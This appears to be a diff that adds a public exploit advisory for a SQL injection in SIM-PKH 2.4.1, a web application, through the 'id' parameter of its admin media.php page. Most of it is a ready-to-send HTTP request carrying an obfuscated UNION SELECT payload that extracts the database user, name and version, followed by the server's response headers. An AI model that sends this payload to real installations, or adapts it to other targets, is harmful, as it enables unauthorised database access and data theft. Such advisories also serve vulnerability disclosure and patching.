@@ -1,0 +1,35 @@
+# Exploit Title: SIM-PKH 2.4.1 - 'id' SQL Injection
+# Dork: N/A
+# Date: 2018-10-22
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://simpkh.sourceforge.io/
+# Software Link: https://sourceforge.net/projects/simpkh/files/latest/download
+# Version: 2.4.1
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# Users....
+# http://localhost/[PATH]/admin/media.php?module=pengurus&act=editpengurus&id=[SQL]
+ 
+GET /[PATH]/admin/media.php?module=pengurus&act=editpengurus&id=-1%27++UniOn(sELect+0x283129%2cCONCAT(0x203a20,User(),DatabaSE(),VErsiON())%2c0x283329%2c0x283429%2c0x283529%2c%30%78%32%38%33%36%32%39%2c0x283729%2c0x283829%2c0x283929%2c0x28313029%2c0x28313129%2c0x28313229%2c0x28313329%2c0x28313429%2c0x28313529%2c0x28313629%2c%30%78%32%38%33%31%33%37%32%39%2c0x28313829%2c0x28313929%2c0x28323029%2c%30%78%32%38%33%32%33%31%32%39%2c0x28323229)--+- HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=sbl43od8c5ceereifi8qidm923
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Mon, 22 Oct 2018 15:31:42 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
